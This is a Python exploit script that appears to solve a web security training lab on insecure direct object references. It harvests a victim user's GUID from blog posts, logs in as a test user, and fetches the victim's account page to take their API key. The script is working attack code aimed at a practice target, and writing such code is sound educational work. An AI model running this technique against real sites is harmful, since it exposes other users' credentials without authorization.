# User ID controlled by request parameter, with unpredictable user IDs

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
from bs4 import BeautifulSoup

warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

##########################################################
#	FUNCTIONS
##########################################################

def get_csrf_token(r):
	soup = BeautifulSoup(r.content, 'html.parser')
	csrf_input = soup.find("input", {'name':'csrf'})
	csrf = csrf_input['value']
	print('[+] Found CSRF Token:\t\t%s' % csrf)
	return csrf

def submit_key(s, url, key):
	print('\n[+] Trying to submit the API Key to solve the lab...')
	submit_path = url + '/submitSolution'
	submit_data = {"answer": key}
	r = s.post(submit_path, data=submit_data)
	return r

def get_carlos_guid(s, url):
	print('[+] Retrieving post IDs from the Home page...')
	r = s.get(url)
	time.sleep(1)
	post_ids = re.findall(r'postId=(\w+)"', r.text)
	uniq_post_ids = list(set(post_ids))
	print("[+] PostIds: %s" % uniq_post_ids)
	print('[+] Retrieving Carlos GUID...')
	for i in uniq_post_ids:
		blog_post_path = '/post?postId='
		r = s.get(url + blog_post_path + i)
		time.sleep(1)
		if 'carlos' in r.text:
			guid = re.findall(r"\?userId=(.*)'>", r.text)[0]
			print('[+] Carlos is the author of post #%s: %s' % (i, guid))
			return guid

def get_carlos_key(s, url, guid):
	login_path = url + '/login'
	print('\n[+] Trying to grab CSRF Token to log in..')
	r = s.get(login_path)
	csrf_token = get_csrf_token(r)
	data_login = {'username': 'wiener', 'password': 'peter', 'csrf': csrf_token}
	print('\n[+] Trying to connect to the application as Wiener...')
	r = s.post(login_path, data=data_login)
	time.sleep(1)
	if 'Your username is: wiener' in r.text:
		print('[+] Logged in as Wiener !')
		our_key = re.search('Your API Key is: (.*)</div', r.text).group(1)
		print('[+] Wiener API Key: %s' % our_key)
		carlos_account_path = url + '/my-account?id=' + guid
		print("\n[+] Trying to steal Carlos's API Key...")
		print("[+] Navigating to:\n\t%s" % carlos_account_path)
		r = s.get(carlos_account_path)
		time.sleep(1)
		his_key = re.search('Your API Key is: (.*)</div', r.text).group(1)
		if our_key != his_key:
			print("[+] Found Carlos's API Key: %s" % his_key)
			return his_key
		else:
			print("[-] Failed to steal Carlos's API Key <!>")
			sys.exit(1)
	else:
		print('[-] Failed to connect as Wiener <!>')
		sys.exit(1)

def show_usage():
	print('[+] Usage: %s <URL>' % sys.argv[0])
	print('[+] Example: %s https://www.target.com' % sys.argv[0])
	sys.exit(-1)

##########################################################
#	MAIN
##########################################################

def main():
	print('[+] Lab: User ID controlled by request parameter, with unpredictable user IDs')
	try:
		url = sys.argv[1].strip()
	except IndexError:
		show_usage()
	s = requests.Session()
	s.proxies = proxies		# Comment this line to disable proxying
	s.verify = False
	try:
		r = s.get(url, allow_redirects=False)
		time.sleep(1)
		if '<h1>Error</h1>' in r.text or 'Server Error: Gateway Timeout' in r.text:
			print('\n[-] HOST seems to be down <!>')
			sys.exit(-1)
		else:
			print("[+] Trying to find Unprotected feature to steal Carlos's API Key user...\n")
			time.sleep(1)
			parsed_url = urllib.parse.urlparse(url)
			host = parsed_url.netloc
			if parsed_url.port:
				port = parsed_url.port
			elif parsed_url.scheme == "https":
				port = 443
			elif parsed_url.scheme == "http":
				port = 80
			print(parsed_url)
			url = parsed_url.scheme + '://' + host
			time.sleep(2)
			guid = get_carlos_guid(s, url)
			key = get_carlos_key(s, url, guid)
			submit_key(s, url, key)
			s.cookies.clear()
			time.sleep(2)
			r = s.get(url)
			if 'Congratulations, you solved the lab!' in r.text:
				print('\n[+] The lab is solved !')
	except requests.exceptions.ProxyError:
		print('[-] PROXY seems to be missconfigured <!>')

if __name__ == "__main__":
	main()
